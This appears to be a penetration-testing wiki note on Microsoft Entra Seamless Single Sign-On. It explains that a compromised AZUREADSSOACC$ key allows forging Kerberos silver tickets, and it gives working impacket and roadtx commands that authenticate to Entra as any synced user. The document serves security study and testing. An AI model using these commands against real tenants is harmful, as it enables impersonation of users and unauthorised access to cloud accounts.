---
title: SSSO
---

[[notes/entra/index]] Seamless Single Sign-on automatically authenticates AD users to Entra on their domain-joined machine.

![SSSO flow ([source](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso-how-it-works?source=recommendations))](./ssso-flow.png)

When SSSO is enabled, the AD service account *AZUREADSSOACC$* is created and it's Kerberos key is shared with Entra.
During authentication the browser submits a service ticket to [autologon.microsoftazuread-sso.com](https://autologon.microsoftazuread-sso.com).

If the NT hash or AES key of *AZUREADSSOACC$* is compromised it is possible to create a [[notes/ad/silver-ticket]] for any AD user that is synced to Entra and authenticate to Entra as that user.
Create a silver ticket with [[notes/tools/impacket]] and use it to authenticate with [[notes/tools/roadtools-hybrid]] and [[notes/tools/roadtools]].

~~~ bash
impacket-ticketer -spn http/autologon.microsoftazuread-sso.com -domain corp.local -domain-sid $domainsid -nthash $azureadssoacc -user-id $userrid jdoeadm
krbtoken="$(python3 ./krbsso.py ./jdoeadm.ccache)"
roadtx interactiveauth -t corp.com --krbtoken "$krbtoken"
~~~
